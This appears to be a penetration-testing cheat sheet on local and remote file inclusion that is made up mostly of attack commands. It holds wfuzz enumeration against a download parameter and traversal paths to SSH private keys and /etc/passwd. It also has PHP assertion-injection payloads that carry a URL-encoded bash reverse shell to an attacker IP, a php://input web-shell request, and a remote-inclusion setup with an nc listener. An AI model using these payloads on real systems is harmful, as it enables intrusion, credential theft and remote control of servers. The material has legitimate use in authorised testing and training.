### :open_file_folder: Check file

lists

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt


Enumerate files

```
wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=FUZZ
```

Attempt to read the SSH key

```
../../../../../home/<username>/.ssh/id_rsa
```

Attempt to list the directory contents

```
../../../../../../../../../../../../../../../
```

### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)

```
wfuzz -u http://<target ip>/download.php?downloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1

curl http://<target ip>/download.php?downloadurl=/proc/824/cmdline --output service.txt
```

PHP assertions

```shell
page=' and die(show_source('/etc/passwd')) or '
page=' and die(system('cat /etc/passwd')) or '
# url encode , page=<encode command string>, escape single quotes 
# page=' and die(system('echo \'/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1\' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh')) or '
page=' and die(system('echo '%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F<attacker ip>%2F<attacker port> 0>%261' > %2Ftmp%2Frevshell.sh %26%26 chmod 777 %2Ftmp%2Frevshell.sh %26%26 %2Fbin%2Fbash %2Ftmp%2Frevshell.sh')) or '%0A
```

Burp Suite

```
GET /site/index.php?page=php://input&cmd=id HTTP/1.1
Host: 192.168.0.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=2vqr9cj4hp7d2uva04de1352ro
Upgrade-Insecure-Requests: 1
Content-Length: 41

<?php echo shell_exec($_GET['cmd']); ?>
```

:star: PHP filter chain

https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT

https://ctftime.org/writeup/36071

RFI

- method1 

    attacker

    ```shell
    # modify attcker ip and port, e.g., 192.168.10.100 4444
    locate php-reverse-shell
    # start http server
    sudo python3 -m http.server 80
    # listen on port 4444
    sudo nc -nlvp 4444
    ```

    target

    ```shell
    # vulnerability page
    /test.php?url=http://<attcker ip>:<attacker port>/php-reverse-shell.php
    ```

